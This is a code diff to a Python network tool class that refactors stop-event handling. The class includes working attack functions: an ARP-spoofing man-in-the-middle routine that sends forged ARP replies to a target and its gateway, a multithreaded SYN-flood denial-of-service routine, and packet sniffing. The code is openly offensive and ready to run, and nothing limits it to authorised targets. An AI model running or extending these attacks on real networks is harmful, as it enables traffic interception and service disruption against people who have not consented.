@@ -24,9 +24,10 @@ class AdvancedNetworkAnalyzer:
             print(f"Failed to enable promisc mode: {e}")
             return False
 
-    def mitm_attack(self, target_ip: str, gateway_ip: str, duration: int = 10):
+    def mitm_attack(self, target_ip: str, gateway_ip: str, duration: int = 10, stop_event: threading.Event = None):
         """Execute Man-in-the-Middle attack via ARP Spoofing."""
-        stop_event = threading.Event()
+        if stop_event is None:
+            stop_event = threading.Event()
         
         def arp_spoof():
             try:
@@ -38,14 +39,21 @@ class AdvancedNetworkAnalyzer:
                     return
 
                 while not stop_event.is_set():
-                    # Spoof target: "I am the gateway"
-                    packet1 = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
-                    # Spoof gateway: "I am the target"
-                    packet2 = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
+                    try:
+                         # Spoof target: "I am the gateway"
+                        packet1 = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
+                        # Spoof gateway: "I am the target"
+                        packet2 = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
+                        
+                        scapy.send(packet1, verbose=False)
+                        scapy.send(packet2, verbose=False)
+                    except:
+                        pass # Ignore send errors during shutdown
                     
-                    scapy.send(packet1, verbose=False)
-                    scapy.send(packet2, verbose=False)
-                    time.sleep(2)
+                    # Wait 2s or stop if event set
+                    if stop_event.wait(2):
+                        break
+
             except Exception as e:
                 print(f"MITM Error: {e}")
 
@@ -54,23 +62,25 @@ class AdvancedNetworkAnalyzer:
         thread.daemon = True
         thread.start()
         
-        # In a real app we'd manage this state better, for now we block/sleep for demo
-        # or just return "Attacking" and let it run.
-        # Given the API request/response nature, we'll run for duration then stop.
-        time.sleep(duration)
-        stop_event.set()
+        # Wait for duration OR until stop_event is set
+        stop_event.wait(duration)
+        stop_event.set() # Ensure loop breaks if time up
         
         # Restore (simplify for demo)
         return {"status": "completed", "duration": duration}
 
-    def dos_attack(self, target_ip: str, port: int = 80, duration: int = 30):
+    def dos_attack(self, target_ip: str, port: int = 80, duration: int = 30, stop_event: threading.Event = None):
         """Execute DoS attack (SYN Flood)."""
-        stop_event = threading.Event()
+        if stop_event is None:
+            stop_event = threading.Event()
         
         def flood():
             packet = scapy.IP(dst=target_ip) / scapy.TCP(dport=port, flags="S")
             while not stop_event.is_set():
-                scapy.send(packet, verbose=False)
+                try:
+                    scapy.send(packet, verbose=False)
+                except:
+                    break
         
         threads = []
         for _ in range(5): # Limit threads for safety in demo
@@ -79,7 +89,7 @@ class AdvancedNetworkAnalyzer:
             t.start()
             threads.append(t)
             
-        time.sleep(duration)
+        stop_event.wait(duration)
         stop_event.set()
         return {"status": "completed", "packets_sent": "lots"}
 
@@ -170,11 +180,11 @@ class AdvancedNetworkAnalyzer:
         except:
             return "Unknown"
 
-    async def packet_capture(self, duration: int = 5, packet_count: int = 50, display_filter: str = "") -> List[Dict[str, Any]]:
+    async def packet_capture(self, duration: int = 5, packet_count: int = 50, display_filter: str = "", stop_event: threading.Event = None) -> List[Dict[str, Any]]:
         """Capture packets for a fixed duration and return simplified details."""
-        return await asyncio.to_thread(self._packet_capture_sync, duration, packet_count, display_filter)
+        return await asyncio.to_thread(self._packet_capture_sync, duration, packet_count, display_filter, stop_event)
 
-    def _packet_capture_sync(self, duration: int, packet_count: int, display_filter: str) -> List[Dict[str, Any]]:
+    def _packet_capture_sync(self, duration: int, packet_count: int, display_filter: str, stop_event: threading.Event = None) -> List[Dict[str, Any]]:
         packets_data = []
         try:
             # Use a new event loop for this thread if strictly needed by pyshark, 
@@ -189,6 +199,9 @@ class AdvancedNetworkAnalyzer:
             # Iterate synchronously
             for packet in capture.sniff_continuously(packet_count=packet_count):
                 if time.time() - start_time > duration:
+                    break
+                
+                if stop_event and stop_event.is_set():
                     break
                 
                 try:
